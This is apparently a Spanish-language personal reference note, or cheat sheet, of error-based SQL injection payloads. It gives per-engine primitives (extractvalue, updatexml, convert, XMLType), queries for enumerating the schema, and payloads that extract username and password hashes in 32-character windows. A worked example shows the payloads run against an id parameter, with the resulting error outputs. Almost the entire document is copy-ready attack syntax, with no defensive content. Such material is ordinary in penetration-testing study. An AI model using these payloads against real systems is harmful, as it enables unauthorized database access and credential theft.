---
tipo: meta
aliases:
  - Payloads error-based
tags:
  - meta/referencia
  - dominio/web
---

# SQLi error-based - matriz de referencia

> [!info] Referencia pura, no un zettel
> El criterio de cuándo usar este canal está en [[SQLi - canal basado en errores]]. Acá la sintaxis. Confirmación de inyección y descubrimiento del cierre: comunes a todo SQLi, ver [[SQLi UNION - matriz de referencia]] pasos 0-2.
>
> `yi``  ` copia el payload de la línea. Ejemplos MySQL salvo donde se indica.

## 1. La primitiva por motor

La subconsulta va donde dice `(SELECT ...)`. El `0x7e` (`~`) marca el inicio del dato en el mensaje.

`... AND extractvalue(1,concat(0x7e,(SELECT ...)))`
MySQL. La de uso diario.

`... AND updatexml(1,concat(0x7e,(SELECT ...)),1)`
MySQL. Equivalente a extractvalue; sirve como alternativa si una está filtrada.

`... AND (SELECT 1 FROM(SELECT count(*),concat((SELECT ...),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)`
MySQL. Fallback (`floor(rand)`) cuando extractvalue y updatexml están filtradas.

`... AND 1=convert(int,(SELECT ...))`
MSSQL. También `... AND 1=cast((SELECT ...) as int)`.

`... AND 1=cast((SELECT ...) as int)`
PostgreSQL.

`... AND 1=ctxsys.drithsx.sn(1,(SELECT ...))`
Oracle.

`... AND (SELECT upper(XMLType(chr(60)||chr(58)||(SELECT ...)||chr(62))) FROM dual) IS NOT NULL`
Oracle. Alternativa vía XMLType cuando `ctxsys` no está.

## 2. Reconocimiento

`' AND extractvalue(1,concat(0x7e,version()))-- -`
Versión del motor.

`' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -`
Base activa.

`' AND extractvalue(1,concat(0x7e,current_user()))-- -`
Usuario actual.

## 3. Enumerar el catálogo

`' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- -`
Primera tabla. Iterar el `LIMIT 0,1` → `1,1` → `2,1`.

`' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))-- -`
Primera columna de `users`. Iterar igual.

## 4. Extraer con truncamiento

El mensaje corta a ~32 caracteres, así que un hash sale por pedazos.

`' AND extractvalue(1,concat(0x7e,(SELECT substring(concat(username,0x3a,password),1,32) FROM users LIMIT 0,1)))-- -`
Primeros 32 caracteres del primer usuario.

`' AND extractvalue(1,concat(0x7e,(SELECT substring(concat(username,0x3a,password),32,32) FROM users LIMIT 0,1)))-- -`
Caracteres 32 a 64. Seguir corriendo la ventana.

## Ejemplo completo

MySQL, la app filtra el error en un `500` visible.

```
1. ?id=1'                → 500 con "You have an error in your SQL syntax": inyección + errores visibles

2. ?id=1' AND extractvalue(1,concat(0x7e,version()))-- -
   → "XPATH syntax error: '~8.0.35'"

3. ?id=1' AND extractvalue(1,concat(0x7e,(SELECT table_name
      FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- -
   → "XPATH syntax error: '~users'"

4. ?id=1' AND extractvalue(1,concat(0x7e,(SELECT column_name
      FROM information_schema.columns WHERE table_name='users' LIMIT 3,1)))-- -
   → "XPATH syntax error: '~password'"

5. ?id=1' AND extractvalue(1,concat(0x7e,(SELECT substring(password,1,32)
      FROM users LIMIT 0,1)))-- -
   → "XPATH syntax error: '~$2y$10$N9qo8uLOickgx2ZMRZo'"
```

## Errores y límites

| Síntoma | Qué pasó |
|---|---|
| `~` seguido del dato en el mensaje | Funcionó |
| Mensaje genérico sin `~` | Errores suprimidos → pasar a booleano ciego |
| El dato sale cortado a 32 chars | Normal — usar `substring` y correr la ventana |
| `XPATH syntax error: '~'` sin nada más | La subconsulta no devolvió filas |

## Relacionadas

[[SQLi - canal basado en errores]] · [[MOC - SQL injection]] · [[Dialectos SQL - matriz de referencia]]
